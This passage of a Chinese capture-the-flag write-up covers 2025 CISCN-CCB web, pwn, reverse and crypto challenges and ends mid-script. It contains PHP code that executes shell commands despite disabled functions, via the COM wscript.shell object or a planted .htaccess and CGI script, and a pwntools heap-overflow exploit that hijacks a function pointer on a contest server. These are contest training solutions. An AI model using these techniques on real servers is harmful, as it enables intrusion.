class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">/*</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * COM执行: 仅限windows</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * work on:</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * php <span class="number">5.4</span>.45</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> *</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * *******</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * fail:</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * &gt; php <span class="number">5.5</span>.38</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> *</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> */</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function com_exec(<span class="name">$cmd</span>){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $cmd = <span class="string">"cmd.exe /c "</span>.$cmd;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $cmd_arr = send_cmd(<span class="name">$cmd</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    echo <span class="string">"执行时候会黑框, 需要时间; 如果有延时命令执行的时候特别需要注意一下。"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $wscript = new COM(<span class="name">'wscript.shell'</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $wscript-&gt;Run(<span class="name">$cmd_arr</span>[0]);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    sleep(<span class="name">1</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    return recv_result(<span class="name">$cmd_arr</span>[1]);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//echo com_exec(<span class="name">$_GET</span>['cmd']);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">/*</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * Apache mod-cgi: Windows &amp;&amp; Linux</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * 需要保证一个web目录可写可访问</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> *</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> * 注意备份htaccess</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"> */</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">function apache_cgi_exec(<span class="name">$cmd</span>, <span class="attr">$dir</span>=<span class="string">'.'</span>){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    echo <span class="string">"由于是系统调用cmd执行后命令，会有一些延迟。请新建目录执行, 以免htaccess出问题导致本身shell不可访问。"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    // check</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//    if(!<span class="name">in_array</span>(<span class="name">'mod_cgi'</span>, apache_get_modules()) &amp;&amp; !empty(<span class="name">$_SERVER</span>['HTACCESS']) &amp;&amp; is_writable(<span class="name">$dir</span>)){</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//        return FAILURE;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">//    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    $cmd_arr = send_cmd(<span class="name">$cmd</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    if(<span class="name">OS</span> == <span class="string">"Windows"</span>) {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $shell_file = <span class="string">"bye.bat"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $htaccess = <span class="string">"ScriptInterpreterSource Registry-Strict\nAddHandler cgi-script .bat\nOptions +ExecCGI +FollowSymlinks"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $cmd_arr[0] = escapeshellcmd(<span class="name">$cmd_arr</span>[0]);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $content = <span class="string">"@echo off\necho Content-Type: text/html\nfor /F %%i in ('$cmd_arr[0]') do ( set result=%%i)"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    } else {</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $shell_file = <span class="string">"1.bylinux"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $htaccess = <span class="string">"Options +ExecCGI\nAddHandler cgi-script .bylinux"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">        $content = <span class="string">"#!/bin/bash\necho \"Content-Type: text/html\\n\\n\"\n"</span> . $cmd_arr[0];</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    }</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    write_file(<span class="name">'.htaccess'</span>, $htaccess);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    write_file(<span class="name">$shell_file</span>, $content);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    echo <span class="string">"&lt;img src = '$shell_file' style = 'display:none;'&gt;"</span>;</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    sleep(<span class="name">1</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">    echo recv_result(<span class="name">$cmd_arr</span>[1]);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">echo ld_preload_exec_cmd(<span class="name">'cat /run/log/d8ba573026fb028f7cf59218bafb6df3/flag'</span>);</span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="template-variable"><span class="language-handlebars">)}}</span></span></span><br></pre></td></tr></table></figure>
<p><img src="/images/2025CISCN-CCB/9.png" alt=""></p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="note"><a href="#note" class="headerlink" title="note"></a><strong>note</strong></h3><blockquote>
<p>放入ida，看一下程序逻辑</p>
<p>重命名一下，看见了amenu函数</p>
</blockquote>
<p><img src="/images/2025CISCN-CCB/10.png" alt=""></p>
<blockquote>
<p>不同的选项，对应不同的功能，后续分析要用</p>
</blockquote>
<p><img src="/images/2025CISCN-CCB/11.png" alt=""></p>
<blockquote>
<p>不同的分支，对应不同的功能，则可以定位到不同的功能分支。</p>
</blockquote>
<p><img src="/images/2025CISCN-CCB/12.png" alt=""></p>
<p>观察new部分</p>
<p>分析可以知道，chunk的第一个元素被赋值为函数指针，因此根据c++一堆函数指针调用函数的特性，完全可以从此处入手，分析是否有机会可以覆盖函数指针，然后调用我们自己的函数，接下来的问题就是不知道有没有后门函数</p>
<p>：可以找到一个后门，下面就可以考虑覆盖函数指针，使其指向此函数即可。</p>
<p><img src="/images/2025CISCN-CCB/13.png" alt=""></p>
<p><img src="/images/2025CISCN-CCB/14.png" alt=""></p>
<p><img src="/images/2025CISCN-CCB/15.png" alt=""></p>
<p><img src="/images/2025CISCN-CCB/16.png" alt=""></p>
<p>接着可以分析edit：</p>
<p>存在溢出：</p>
<p><img src="/images/2025CISCN-CCB/17.png" alt=""></p>
<blockquote>
<p>可以溢出到下一个chunk的函数指针。</p>
</blockquote>
<p><img src="/images/2025CISCN-CCB/18.png" alt=""></p>
<blockquote>
<p>之后会调用此函数指针指向的函数</p>
</blockquote>
<p><img src="/images/2025CISCN-CCB/19.png" alt=""></p>
<blockquote>
<p>思路现在就清晰了，可以申请两个chunk，通过上一个覆盖下一个chunk的函数指针，使其指向我们的后门函数即可。但是现在的问题是如何找到指向后门的指针，观察show函数的时候就会知道需要我们在heap中填入后门地址，那么heap的指针就成为了指向后门的指针。</p>
<p>由于我们还没有看show函数，思路到这里就卡住了，无法获得一个指向后门的函数指针。</p>
</blockquote>
<p><img src="/images/2025CISCN-CCB/20.png" alt=""></p>
<blockquote>
<p>有个gift会输出意想不到的东西。</p>
</blockquote>
<p><img src="/images/2025CISCN-CCB/21.png" alt=""></p>
<blockquote>
<p>会输出chunk的地址：</p>
</blockquote>
<p><img src="/images/2025CISCN-CCB/22.png" alt=""></p>
<blockquote>
<p>现在我们就知道堆地址了，</p>
<p>我们就可以利用了：代码如下：</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#io = process("./note")</span></span><br><span class="line">io = remote(<span class="string">"47.94.109.203"</span>,<span class="number">24867</span>)</span><br><span class="line">context.log_level =<span class="string">"debug"</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line">io.sendlineafter(<span class="string">b"Choice&gt;&gt;"</span>,<span class="string">b'1'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b"Choice&gt;&gt;"</span>,<span class="string">b'1'</span>)</span><br><span class="line"><span class="comment">###show</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendlineafter(<span class="string">b"Choice&gt;&gt;"</span>,<span class="string">b'1'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b"Choice&gt;&gt;"</span>,<span class="string">b'2'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b"index: "</span>,<span class="string">b'2'</span>)</span><br><span class="line">io.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">heapadd = io.recvline()</span><br><span class="line">heapadd = <span class="built_in">int</span>(heapadd,<span class="number">16</span>)</span><br><span class="line">binptr = heapadd + <span class="number">0x9418ff8</span>-<span class="number">0x9419010</span>-<span class="number">0x20</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heapadd))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">###show</span></span><br><span class="line">io.sendlineafter(<span class="string">b"Choice&gt;&gt;"</span>,<span class="string">b'3'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b"index: "</span>,<span class="string">b'0'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b"len: "</span>,<span class="string">b'28'</span>)</span><br><span class="line"><span class="comment">#payload = 7*p32(0x080489CE)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendlineafter(<span class="string">b"content: "</span>,<span class="number">5</span>*p32(<span class="number">0x080489CE</span>)+p32(<span class="number">0x21</span>)+p32(binptr))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#print(io.recv())</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b"Choice&gt;&gt;"</span>,<span class="string">b'3'</span>)</span><br><span class="line"><span class="comment">#print(io.recv())</span></span><br><span class="line">io.sendlineafter(<span class="string">b"index: "</span>,<span class="string">b'1'</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b"len: "</span>,<span class="string">b'32'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b"content: "</span>,<span class="string">b'aaa'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="dump"><a href="#dump" class="headerlink" title="dump"></a>dump</h3><p>题目里有两个文件，一个是十六进制文件，一个是exe文件。打开十六进制文件，先保存数据</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">23291e24380</span>e1520370e0520000e37121d0f24010139</span><br></pre></td></tr></table></figure>
<p>使用IDA打开程序，发现main里就是逻辑。这里的argv[1]就是我们的输入</p>
<p><img src="/images/2025CISCN-CCB/23.png" alt=""></p>
<p>经过动态调试，下断点，调试后发现这里是对输入做变换，然后打印出来。</p>
<p><img src="/images/2025CISCN-CCB/24.png" alt=""></p>
<p>输入flag{1234567890}:输出如下图所示，f是23，之后的数字是后续。</p>
<p><img src="/images/2025CISCN-CCB/25.png" alt=""></p>
<p><img src="/images/2025CISCN-CCB/26.png" alt=""></p>
<p>观察上述数据和十六进制文件的关系，因为一直没看到有对文件进行操作，所以这里比较疑惑。然后比较的时候可以发现前面的数值是雷同的。</p>
<p>多试了几次，发现每个字符对应编码出来的值是一样的。互相之间是独立计算的。所以使用python的库：from string import printable。对里面的字符打印出来，做成一张表来对应。</p>
<p>其中有些字符是0，没有对应的值，打出来数字1和2是有对应值的，2以后都不行，都是0。同时提示说了长度和第13位。因为0有很多可能，根据提示能知道，这一位是4。根据表可得flag</p>
<p><img src="/images/2025CISCN-CCB/27.png" alt=""></p>
<p>最终打表可得：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">flag{      M  T   c  z  M  D  c  4  M  z  Q  2  N  g =  =  }</span></span><br><span class="line"><span class="string">23291e2438 0e 15 20 37 0e 05 20 00 0e 37 12 1d 0f 24 01 01 39</span></span><br><span class="line"><span class="string">1 2 3 4 5  6  7  8  9  10 11 12 13 14 15</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># a   b c   d  e  f  g  h  i  j  k l   m  n  o  p  q  r s  t   u   v   w  x  y  z  1  2</span></span><br><span class="line"><span class="comment"># 1e 1f 20 21 22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f 30 31 32  33  34 35 36 37 1c 1d</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># A   B  C  D  E  F  G  H  I J  K  L  M  N  O  P  Q  R  S   T  U  V W   X  Y Z</span></span><br><span class="line"><span class="comment"># 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f 10 11 12 13 14 15 16 17 18 19 1a 1b</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"><span class="keyword">for</span> tmp <span class="keyword">in</span> printable:</span><br><span class="line">    <span class="built_in">print</span>(tmp,end=<span class="string">""</span>)</span><br><span class="line"><span class="comment">#flag{MTczMDc4MzQ2Ng==}</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/2025CISCN-CCB/28.png" alt=""></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="fffffhash"><a href="#fffffhash" class="headerlink" title="fffffhash"></a>fffffhash</h3><p>分析0x0000000001000000000000000000013b这一串数字，在网上查找</p>
<p>发现这是128位的FNV哈希的一个参数，在网上搜索FNV相关的知识，结果搜到了类似的题目（64位FNV）</p>
<p><img src="/images/2025CISCN-CCB/29.png" alt=""></p>
<p>然后将解题脚本稍微修改了一下，就跑出来了</p>
<p>py脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">TARGET = <span class="number">201431453607244229943761366749810895688</span></span><br><span class="line">h0 = <span class="number">0x6c62272e07bb014262b821756295c58d</span></span><br><span class="line">p = <span class="number">0x0000000001000000000000000000013b</span></span><br><span class="line">MOD = <span class="number">2</span>^<span class="number">128</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">30</span></span><br><span class="line">M = Matrix.column([p^(n - i - <span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)] + [-(TARGET - h0*p^n), MOD])</span><br><span class="line">M = M.augment(identity_matrix(n+<span class="number">1</span>).stack(vector([<span class="number">0</span>] * (n+<span class="number">1</span>))))</span><br><span class="line">Q = Matrix.diagonal([<span class="number">2</span>^<span class="number">128</span>] + [<span class="number">2</span>^<span class="number">4</span>] * n + [<span class="number">2</span>^<span class="number">8</span>])</span><br><span class="line">M *= Q</span><br><span class="line">M = M.BKZ()</span><br><span class="line">M /= Q</span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> M:</span><br><span class="line">    <span class="keyword">if</span> r[<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">and</span> <span class="built_in">abs</span>(r[-<span class="number">1</span>]) == <span class="number">1</span>:</span><br><span class="line">        r *= r[-<span class="number">1</span>]</span><br><span class="line">        good = r[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(good)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">inp = []</span><br><span class="line">y = <span class="built_in">int</span>(h0*p)</span><br><span class="line">t = (h0*p^n + good[<span class="number">0</span>] * p^(n-<span class="number">1</span>)) % MOD</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        y_ = (<span class="built_in">int</span>(y) ^^ <span class="built_in">int</span>(x)) * p^(n-i-<span class="number">1</span>) % MOD</span><br><span class="line">        <span class="keyword">if</span> y_ == t:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">'good'</span>, i, x)</span><br><span class="line">            inp.append(x)</span><br><span class="line">            <span class="keyword">if</span> i &lt; n-<span class="number">1</span>:</span><br><span class="line">                t = (t + good[i+<span class="number">1</span>] * p^(n-i-<span class="number">2</span>)) % MOD</span><br><span class="line">                y = ((<span class="built_in">int</span>(y) ^^ <span class="built_in">int</span>(x)) * p) % MOD</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'bad'</span>, i)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(inp).<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>
<p>跑出来的结果：</p>
<p><img src="/images/2025CISCN-CCB/30.png" alt=""></p>
<p>所以得到了我们的hex_string</p>
<p>然后nc交互就可以了，如下所示：</p>
<p><img src="/images/2025CISCN-CCB/31.png" alt=""></p>
<p>flag{508074eb-ea1b-4608-9bdb-64e6d73e2655}</p>
<h3 id="rasnd"><a href="#rasnd" class="headerlink" title="rasnd"></a>rasnd</h3><p>两个部分的拼凑</p>
<p>第一部分是前段时间强网杯的apdq的第二部分，直接套板子就出来了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#part1</span></span><br><span class="line">n=<span class="number">28887811227499051616528094429019003663717623904277565919075044655116848454702243443222138650839802532457876075543066292240383592982003544521377684917140524085713240851320087700637160892340521450393565882070831401986253770658662871222156018676508909050373444215149175943226203798935993199035325044630185976663003232467964487143314972938428288758994373432653784346882713174719140391514347600850788886148311039655932116903027672113333591490675960703395369201502464526771460999324722209109938614286150245265511899004435237837454069138941745952479175479274675250566087400534051161079388742074574161312192043701412913886879</span></span><br><span class="line">c=<span class="number">12904862358252536205392970372996437799373602343641649800438666554968935383265314461895472296763366221390375513224953980022691144110127251816378756979174253143874738105909473714409576815667746200188582929727948993200023081398594917163571324435295811041599701791670116306237799243786230718765077662418219690489181151068715116557561366214233881032505810402132893400971807723389883203848637967177002497144918823825923464608185799494223184876201542806244059208328032164925668486389879511335562451730919596497353207496613303380375801193934636085352103680453435947151045227281898926345875209127168252450738017665556659823293</span></span><br><span class="line">hint1=<span class="number">377177973587575850466901754568881568812740281610024306026199181684494762091512999340415335806051052710588140980770351324449498146395095691664930883421912024544523884628292027615631463699276645005996099180207059939697896427175045969513335989186018906424156601382567472008947296866700129244023038476994696464956187676767165999552159908068623501</span>+<span class="number">0x114</span></span><br><span class="line">hint2=<span class="number">7181804289463325714939537449620677120608402749084085104997954266645742337112146883176759025627406327132463813893784187427062727563053446288300954407999801433816793840360522607395887308951891396620953517561723843530407447008241903967390660485941935151813958917072982711483327150689765967737844070049797477796050409421814053857382004868595748173297461069739232023287436317552899867260535988259736223827987858334777288892948771592938879108032542724655660055953059782</span>+<span class="number">0x514</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="comment">#from Crypto.Util.number import long_to_bytes</span></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a1, a2 <span class="keyword">in</span> tqdm(<span class="built_in">list</span>(itertools.product(<span class="built_in">range</span>(<span class="number">2</span>**<span class="number">12</span>), repeat=<span class="number">2</span>))):</span><br><span class="line">    kq = gcd(a1 * hint1 - a2 * hint2, n)</span><br><span class="line">    <span class="keyword">if</span> <span class="number">1</span> &lt; kq &lt; n:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'find!'</span>, kq, a1, a2)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">16</span>, <span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> kq % i == <span class="number">0</span>:</span><br><span class="line">        kq //= i</span><br><span class="line">q = kq</span><br><span class="line">p = n // kq</span><br><span class="line">d = <span class="built_in">pow</span>(<span class="number">0x10001</span>, -<span class="number">1</span>, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure>
<p>解得d后正常解密即可</p>
<p><img src="/images/2025CISCN-CCB/32.png" alt=""></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">d=<span class="number">23907366912691968835577624634040812376408997746619567882551723026751722332211426825663096512569223640927266774269570312320275955813630594133855423265267982137737686456412391728445890603457057882210754631914151602620358454201207818626841297907693214658500615947346704988154826153877815571803377630508751194016044821159736834012130046315763891301572528300800270589349185383179339008172340480814901009286441308922386924830307903892751895522131345775410180999796185964203138795696737875885592819391495282427460200856076157745310030154909372824593618530916342795687746095429297760084659027083995509824303304962460646012273</span></span><br><span class="line">c=<span class="number">12904862358252536205392970372996437799373602343641649800438666554968935383265314461895472296763366221390375513224953980022691144110127251816378756979174253143874738105909473714409576815667746200188582929727948993200023081398594917163571324435295811041599701791670116306237799243786230718765077662418219690489181151068715116557561366214233881032505810402132893400971807723389883203848637967177002497144918823825923464608185799494223184876201542806244059208328032164925668486389879511335562451730919596497353207496613303380375801193934636085352103680453435947151045227281898926345875209127168252450738017665556659823293</span></span><br><span class="line">n=<span class="number">28887811227499051616528094429019003663717623904277565919075044655116848454702243443222138650839802532457876075543066292240383592982003544521377684917140524085713240851320087700637160892340521450393565882070831401986253770658662871222156018676508909050373444215149175943226203798935993199035325044630185976663003232467964487143314972938428288758994373432653784346882713174719140391514347600850788886148311039655932116903027672113333591490675960703395369201502464526771460999324722209109938614286150245265511899004435237837454069138941745952479175479274675250566087400534051161079388742074574161312192043701412913886879</span></span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#b'flag{7f33cdc8-da19-'</span></span><br></pre></td></tr></table></figure>
<p>然后第二部分，就是DUCTF2020的EasyRSA，修改一下数字就可以了</p>
<p><a target="_blank" rel="noopener" href="https://crypto-writeup-public.hatenablog.com/entry/DownUnderCTF%25202020%2520%257C%2520%2520%2520babyRSA">https://crypto-writeup-public.hatenablog.com/entry/DownUnderCTF%25202020%2520%257C%2520%2520%2520babyRSA</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#part2</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy.solvers <span class="keyword">import</span> solve</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> symbols</span><br><span class="line">n=<span class="number">16235562199200267459663730571049431604560323138825891010565012084966378560657028557593713658149224124014019674718841338098341965331592933997415694692050656493911264929774020942179882196570321425270890223396169112762011033004564308723485972391649681397363565727449598074059933122020979277213051522292750681766691422016751120287403039252908062651404902039208868924707593108364706700085611092189177151362213092719343563439787881931506466123650653478905555329561874204870585566987658878227630910823854130181333087408403245083629898953751267545552289595198873283690722202122622106505732576237684209082112223769923295430523</span></span><br><span class="line">c=<span class="number">11618635355226290496294059660684603271588961451576288595852951276334806609033643787615488344507896857194047959998447214859969744967026400630924460267578943153410706528035442130937391499097216199001992180336450905339834216101657701141898474167790182212942369008350602241504906953057533358121870137756984024718626959548768270243611602403692209977991118081549322098177312841836591127963898605893447513836841527304670334168898249244877428516320988326935026436339811852851774767266645087443342058339001680095456544461819091726014417859396827670899885993279204262383019508480189625007076070194718973783400618991012898398971</span></span><br><span class="line">s=<span class="number">7547052520968274686361390354285315087014340779570155974910998576495561953587318079357069880644559171407046420462937990129522060964321221028493396033041599196464187957179980446173784787331698698561742332536751956414220040013365969434115189539462094772621278876850660929745673861325132019440705142779617380382511054084461569440985254700562753414759088555879937884688154445987875415437130349205506768368786816237719717004795323391266775205156239444277181913569391343776187901301703075697132319977481036429174361283683381079528630613358434337746208635554486300034455331087173311239089359066587253492149727949991752157130</span></span><br><span class="line"></span><br><span class="line">t = invert(s, n)</span><br><span class="line"></span><br><span class="line">p, q = symbols(<span class="string">"p, q"</span>, integer=<span class="literal">True</span>)</span><br><span class="line">solutions = solve([<span class="number">514</span>*p - <span class="number">114</span>*q - t, p*q - n])</span><br><span class="line">p = solutions[<span class="number">0</span>][p]</span><br><span class="line">q = solutions[<span class="number">0</span>][q]</span><br><span 